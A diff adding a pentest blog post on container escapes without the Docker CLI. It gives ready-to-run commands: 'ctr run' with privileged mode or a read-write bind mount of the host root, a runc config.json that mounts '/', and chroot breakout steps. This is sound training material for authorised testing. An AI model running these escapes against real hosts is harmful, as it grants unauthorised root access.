@@ -1,0 +1,115 @@
+---
+title: "Docker escapes without the Docker CLI: containerd, runc, and chroot"
+description: "When docker is not installed but containerd or runc is reachable, how to bind-mount the host root, use ctr for privesc, and break out of limited chroot shells."
+date: 2022-02-20
+seriesSlug: "docker-offensive"
+seriesTitle: "Attacking Docker"
+seriesPart: 4
+seriesDescription: "Offensive Docker: container triage through escape paths, capabilities, registries, and runtime abuse."
+tags: ["docker", "containerd", "runc", "container-escape", "docker-offensive"]
+---
+
+> Lab notes from authorised assessments and training environments. Do not point these techniques at systems you do not own or have written permission to test.
+
+Docker is the interface most people know, but the actual work happens lower in the stack: **containerd** manages images and container lifecycle, and **runc** is the OCI runtime that creates the isolated process. On minimal hosts, Kubernetes nodes, and stripped-down lab VMs I often find `ctr` or `runc` without a working `docker` command. This post covers those paths after [triage](/blog/docker-pentest-playbook/).
+
+## How the stack fits together
+
+```
+docker CLI ──► dockerd ──► containerd ──► runc ──► container process
+```
+
+When `dockerd` is absent or unreachable, an unprivileged user who can still talk to containerd or execute `runc` may spawn workloads with dangerous mount options. The [OCI runtime specification](https://github.com/opencontainers/runtime-spec) defines the `config.json` that `runc` consumes.
+
+## containerd and ctr
+
+`ctr` is containerd's CLI. If my user can run it against the host socket, I list images and run containers with bind mounts or full privilege:
+
+```bash
+ctr --version
+ctr images list
+ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest shell bash
+```
+
+Host filesystem via bind mount:
+
+```bash
+ctr run --mount type=bind,src=/,dst=/,options=rbind:rw \
+  -t registry:5000/modified-ubuntu:latest ubuntu bash
+```
+
+Useful `ctr` operations during assessments:
+
+```bash
+ctr images pull --skip-verify --plain-http registry:5000/alpine:latest
+ctr container create --mount "type=bind,src=/,dst=/mnt,options=rbind:rw" \
+  registry:5000/alpine:latest alpine
+ctr container ls
+ctr task start -d alpine
+ctr task attach alpine
+```
+
+See the [containerd documentation](https://github.com/containerd/containerd/blob/main/docs/getting-started.md) for socket locations and permissions. Unauthorized access to the containerd socket is equivalent to unauthorized access to docker.sock from an impact perspective.
+
+## runc spec escape
+
+When `runc` is installed and I can write a spec in my home directory, I do not need containerd at all:
+
+```bash
+runc spec
+mkdir rootfs
+```
+
+Edit `config.json` and add a bind mount of the host root into the container namespace:
+
+```json
+{
+  "type": "bind",
+  "source": "/",
+  "destination": "/",
+  "options": ["rbind", "rw", "rprivate"]
+}
+```
+
+```bash
+runc run demo
+```
+
+I am now operating on the host filesystem. The [runc repository](https://github.com/opencontainers/runc) documents spec fields; the bind mount abuse is a permission problem on who may invoke `runc` with arbitrary configs.
+
+## skopeo and umoci (OCI bundle path)
+
+When I can reach a private registry but not the daemon, I sometimes pull images with [skopeo](https://github.com/containers/skopeo) and unpack them with [umoci](https://github.com/opencontainers/umoci) to build a runc bundle offline:
+
+```bash
+skopeo --insecure-policy copy --src-tls-verify=false \
+  docker://registry:5000/alpine oci:alpine-oci:latest
+umoci unpack --image alpine-oci:latest alpinefs
+runc run -b alpinefs ctrid
+```
+
+This is slower than `ctr run` but works when only registry port 5000 is exposed and the runtime binaries are present locally.
+
+## Breaking out of chroot
+
+Not every container escape ends at the daemon. Sometimes I land in a restricted shell inside a chroot or minimal filesystem. First I inventory what binaries exist:
+
+```bash
+command -v gcc python3 perl busybox
+ls /usr/bin /usr/local/bin /bin/
+```
+
+If compilers or interpreters are present, [HackTricks chroot escape notes](https://book.hacktricks.wiki/linux-hardening/privilege-escalation/escape-from-chroot) list breakout patterns (mount proc, copy shell into writable path, abuse `/dev/null` if misconfigured). The goal is always the same: regain a process that sees the real host root, then pivot to [escape paths](/blog/docker-escape-paths/) or [capabilities](/blog/docker-linux-capabilities/).
+
+## How containers are actually built (context only)
+
+Understanding namespaces and cgroups helps me know what broke when an escape works. A minimal container needs an isolated PID/network/mount view, a root filesystem, and cgroup limits. Lab notes often walk through `unshare`, `cgexec`, and `chroot` manually; I do not need to build containers by hand on engagements, but recognizing those primitives explains why a missing namespace is exploitable.
+
+```bash
+lsns
+unshare --fork --pid --mount-proc bash
+```
+
+The [Linux namespaces man page](https://man7.org/linux/man-pages/man7.namespaces.7.html) is the reference I keep open when reading `lsns` output from a weird lab VM.
+
+Next: [registry abuse, layer forensics, and supply-chain backdoors](/blog/docker-registry-offensive/).
